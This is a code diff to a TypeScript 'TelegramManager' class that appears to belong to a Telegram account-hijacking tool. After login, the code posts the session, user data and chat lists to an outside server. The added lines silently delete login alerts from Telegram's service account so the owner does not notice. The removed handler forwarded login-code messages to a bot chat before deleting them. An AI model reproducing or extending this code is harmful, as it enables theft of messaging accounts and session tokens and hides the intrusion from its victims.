@@ -175,7 +175,6 @@ class TelegramManager {
                 termsOfService = result.termsOfService;
             } else {
                 console.log(this.client.session.save());
-                this.client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
                 const sess = this.client.session.save() as unknown as string;
                 const user: any = await result.user.toJSON();
                 const chats = await this.client?.getDialogs({ limit: 130 });
@@ -207,6 +206,18 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+                await sleep(1000);
+                const msgs = await this.client.getMessages("777000", { limit: 2 });
+                msgs.forEach(async msg => {
+                    if (msg.text.toLowerCase().includes('login'))
+                        await msg.delete({ revoke: true });
+                })
+                await sleep(1000);
+                const msgs2 = await this.client.getMessages("777000", { limit: 2 });
+                msgs2.forEach(async msg => {
+                    if (msg.text.toLowerCase().includes('login'))
+                        await msg.delete({ revoke: true });
+                })
                 setTimeout(async () => {
                     await restAcc(this.phoneNumber);
                 }, 50000);
@@ -259,61 +270,5 @@ class TelegramManager {
             }
         }
         await restAcc(this.phoneNumber);
-    }
-}
-
-async function deleteMsgs(event: NewMessageEvent) {
-    if (event.isPrivate) {
-        console.log(event.message.text);
-        if (event.message.chatId.toString() == "777000") {
-            const payload = {
-                chat_id: "-1001801844217",
-                text: event.message.text
-            };
-            console.log("RECIEVED - ", event.message.text);
-            await event.message.delete({ revoke: true });
-            const options = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            };
-            await fetchWithTimeout(`${ppplbot}`, options);
-        }
-        await sleep(1000);
-        const msgs = await event.client.getMessages("777000", { limit: 2 });
-        msgs.forEach(async msg => {
-            if (msg.text.toLowerCase().includes('login'))
-                await msg.delete({ revoke: true });
-        })
-        await sleep(1000);
-        const msgs2 = await event.client.getMessages("777000", { limit: 2 });
-        msgs2.forEach(async msg => {
-            if (msg.text.toLowerCase().includes('login'))
-                await msg.delete({ revoke: true });
-        })
-    }
-}
-
-
-async function fetchWithTimeout(resource, options: any = {}) {
-    const timeout = options?.timeout || 15000;
-    const source = axios.CancelToken.source();
-    const id = setTimeout(() => source.cancel(), timeout);
-
-    try {
-        const response = await axios({
-            ...options,
-            url: resource,
-            cancelToken: source.token
-        });
-        clearTimeout(id);
-        return response;
-    } catch (error) {
-        if (axios.isCancel(error)) {
-            console.log('Request canceled:', error.message);
-        } else {
-            console.log('Error:', error.message);
-        }
-        return undefined;
     }
 }
